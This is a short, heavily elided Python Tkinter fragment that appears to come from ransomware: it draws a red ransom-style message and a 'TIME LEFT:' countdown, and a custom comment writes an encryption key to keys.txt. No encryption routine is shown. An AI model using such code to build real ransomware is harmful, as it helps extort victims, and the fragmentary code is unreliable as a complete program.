...
"""
        Label(self, text=message, font="Helvetica 16 bold", foreground="white", background="red").grid(
        ...
        def start_timer():
            Label(self, text="TIME LEFT:", font="Helvetica 18 bold", foreground="red", background="black").grid(
            ...
            try:
                ...
                while s:
                    ...
                    Label(self, text=time_left, font="Helvetica 18 bold", foreground="red", background="black").grid(
...
# CUSTOM: Write keys to keys.txt so that we keep these files
f = open("./keys.txt", "a+")
f.write(f"KEY: {key}")
f.close()
